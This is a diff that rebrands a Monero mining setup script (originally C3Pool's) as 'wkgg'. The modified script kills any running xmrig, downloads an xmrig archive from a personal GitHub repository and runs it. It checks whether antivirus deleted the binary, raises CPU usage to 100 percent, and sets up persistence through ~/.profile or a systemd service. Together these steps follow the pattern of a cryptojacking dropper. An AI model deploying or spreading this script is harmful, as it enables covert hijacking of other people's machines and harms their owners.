@@ -4,8 +4,8 @@ VERSION=2.11
 
 # printing greetings
 
-echo "C3Pool mining setup script v$VERSION."
-echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
+echo "Wkgg mining setup script v$VERSION."
+echo "(please report issues to admin@admin.com email with full output of this script with extra \"-x\" \"bash\" option)"
 echo
 
 if [ "$(id -u)" == "0" ]; then
@@ -21,7 +21,7 @@ EMAIL=$2 # this one is optional
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_c3pool_miner.sh <wallet address> [<your email address>]"
+  echo "> setup_wkgg_miner.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -123,12 +123,12 @@ fi
 
 echo "I will download, setup and run in background Monero CPU miner."
 echo "将进行下载设置,并在后台中运行xmrig矿工."
-echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
-echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/c3pool/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/wkgg/miner.sh script."
+echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/wkgg/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
+  echo "(and $EMAIL email as password to modify wallet options later at https://wkgg.com site)"
 fi
 echo
 
@@ -136,8 +136,8 @@ if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
   echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
 else
-  echo "Mining in background will be performed using c3pool_miner systemd service."
-  echo "后台开采将使用c3pool_miner systemd服务执行."
+  echo "Mining in background will be performed using wkgg_miner systemd service."
+  echo "后台开采将使用wkgg_miner systemd服务执行."
 fi
 
 echo
@@ -149,45 +149,45 @@ echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous c3pool miner (if any)"
-echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
+echo "[*] Removing previous wkgg miner (if any)"
+echo "[*] 卸载以前的 wkgg 矿工 (如果存在)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop c3pool_miner.service
+  sudo systemctl stop wkgg_miner.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/c3pool directory"
-rm -rf $HOME/c3pool
+echo "[*] Removing $HOME/wkgg directory"
+rm -rf $HOME/wkgg
 
-echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
-echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
+echo "[*] Downloading wkgg advanced version of xmrig to /tmp/xmrig.tar.gz"
+echo "[*] 下载 Wkgg 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
 if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
-[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
-  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录"
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/wkgg"
+echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg"
+[ -d $HOME/wkgg ] || mkdir $HOME/wkgg
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/wkgg; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/wkgg directory"
+  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg 目录"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
-$HOME/c3pool/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/wkgg/xmrig works fine (and not removed by antivirus software)"
+echo "[*] 检查目录 $HOME/wkgg/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/wkgg/config.json
+$HOME/wkgg/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/c3pool/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/c3pool/xmrig is not functional"
-	echo "警告: 版本 $HOME/c3pool/xmrig 无法正常工作"
+  if [ -f $HOME/wkgg/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/wkgg/xmrig is not functional"
+	echo "警告: 版本 $HOME/wkgg/xmrig 无法正常工作"
   else 
-    echo "WARNING: Advanced version of $HOME/c3pool/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/c3pool/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
+    echo "WARNING: Advanced version of $HOME/wkgg/xmrig was removed by antivirus (or some other problem)"
+	echo "警告: 该目录 $HOME/wkgg/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -203,32 +203,32 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
-	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录下"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/wkgg"
+  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/wkgg --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/wkgg directory"
+	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/wkgg 目录下"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
-  $HOME/c3pool/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/wkgg/xmrig works fine (and not removed by antivirus software)"
+  echo "[*] 检查目录 $HOME/wkgg/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/wkgg/config.json
+  $HOME/wkgg/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/c3pool/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/c3pool/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/xmrig 也无法使用"
+    if [ -f $HOME/wkgg/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/wkgg/xmrig is not functional too"
+	  echo "发生错误: 该目录中的 $HOME/wkgg/xmrig 也无法使用"
     else 
-      echo "ERROR: Stock version of $HOME/c3pool/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/xmrig 已被杀毒软件删除"
+      echo "ERROR: Stock version of $HOME/wkgg/xmrig was removed by antivirus too"
+	  echo "发生错误: 该目录中的 $HOME/wkgg/xmrig 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/c3pool/xmrig is OK"
-echo "[*] 矿工 $HOME/c3pool/xmrig 运行正常"
+echo "[*] Miner $HOME/wkgg/xmrig is OK"
+echo "[*] 矿工 $HOME/wkgg/xmrig 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -238,27 +238,27 @@ if [ -z $PASS ]; then
   PASS=na
 fi
 if [ ! -z $EMAIL ]; then
-  PASS="$PASS-$EMAIL"
+  PASS="$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/c3pool/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json
+sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/wkgg/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/wkgg/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/wkgg/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/wkgg/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/wkgg/xmrig.log'",#' $HOME/wkgg/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/wkgg/config.json
 
-cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_background.json
+cp $HOME/wkgg/config.json $HOME/wkgg/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/wkgg/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HOME/c3pool/miner.sh script"
-echo "[*] 在该目录下创建 $HOME/c3pool/miner.sh 脚本"
-cat >$HOME/c3pool/miner.sh <<EOL
+echo "[*] Creating $HOME/wkgg/miner.sh script"
+echo "[*] 在该目录下创建 $HOME/wkgg/miner.sh 脚本"
+cat >$HOME/wkgg/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HOME/c3pool/xmrig \$*
+  nice $HOME/wkgg/xmrig \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
@@ -267,22 +267,22 @@ else
 fi
 EOL
 
-chmod +x $HOME/c3pool/miner.sh
+chmod +x $HOME/wkgg/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/c3pool/miner.sh script to $HOME/.profile"
-	echo "[*] 添加 $HOME/c3pool/miner.sh 到 $HOME/.profile"
-    echo "$HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep wkgg/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/wkgg/miner.sh script to $HOME/.profile"
+	echo "[*] 添加 $HOME/wkgg/miner.sh 到 $HOME/.profile"
+    echo "$HOME/wkgg/miner.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/c3pool/miner.sh script is already in the $HOME/.profile"
-	echo "脚本 $HOME/c3pool/miner.sh 已存在于 $HOME/.profile 中."
+    echo "Looks like $HOME/wkgg/miner.sh script is already in the $HOME/.profile"
+	echo "脚本 $HOME/wkgg/miner.sh 已存在于 $HOME/.profile 中."
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
-  echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
-  /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/wkgg/xmrig.log file)"
+  echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/wkgg/xmrig.log 日志文件)"
+  /bin/bash $HOME/wkgg/miner.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -294,21 +294,21 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
-    /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/wkgg/xmrig.log file)"
+	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/wkgg/xmrig.log 日志文件)"
+    /bin/bash $HOME/wkgg/miner.sh --config=$HOME/wkgg/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating c3pool_miner systemd service"
-    cat >/tmp/c3pool_miner.service <<EOL
+    echo "[*] Creating wkgg_miner systemd service"
+    cat >/tmp/wkgg_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
+ExecStart=$HOME/wkgg/xmrig --config=$HOME/wkgg/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -316,15 +316,15 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
-    echo "[*] Starting c3pool_miner systemd service"
-	echo "[*] 启动c3pool_miner systemd服务"
+    sudo mv /tmp/wkgg_miner.service /etc/systemd/system/wkgg_miner.service
+    echo "[*] Starting wkgg_miner systemd service"
+	echo "[*] 启动wkgg_miner systemd服务"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable c3pool_miner.service
-    sudo systemctl start c3pool_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
-	echo "查看矿工服务日志,请运行 \"sudo journalctl -u c3pool_miner -f\" 命令"
+    sudo systemctl enable wkgg_miner.service
+    sudo systemctl start wkgg_miner.service
+    echo "To see miner service logs run \"sudo journalctl -u wkgg_miner -f\" command"
+	echo "查看矿工服务日志,请运行 \"sudo journalctl -u wkgg_miner -f\" 命令"
   fi
 fi
 
@@ -342,8 +342,8 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/wkgg/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/wkgg/config_background.json"
 fi
 echo ""
 
